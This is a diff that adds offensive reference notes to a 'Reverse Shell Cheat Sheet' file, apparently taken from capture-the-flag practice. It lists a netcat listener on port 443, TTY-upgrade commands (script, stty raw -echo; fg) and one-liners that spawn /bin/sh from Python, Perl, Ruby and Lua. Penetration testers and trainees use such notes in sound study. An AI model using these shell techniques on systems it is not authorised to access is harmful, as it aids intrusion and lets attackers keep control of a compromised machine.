@@ -1,3 +1,38 @@
+
+```
+script -qc /bin/bash /dev/null
+
+script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+svc@codify:~$ ^Z
+[1]+  Stopped                 nc -lvnp 443
+oxdf@hacky$
+
+stty raw -echo; fg
+nc -lvnp 443
+
+
+echo os.system('/bin/bash')
+/bin/sh -i
+
+#python3
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+#perl
+perl -e 'exec "/bin/sh";'
+
+#ruby
+exec "/bin/sh"
+ruby -e 'exec "/bin/sh"'
+
+#lua
+lua -e "os.execute('/bin/sh')"
+```
+
+   
+            
+
 # Reverse Shell Cheat Sheet
 
 ##
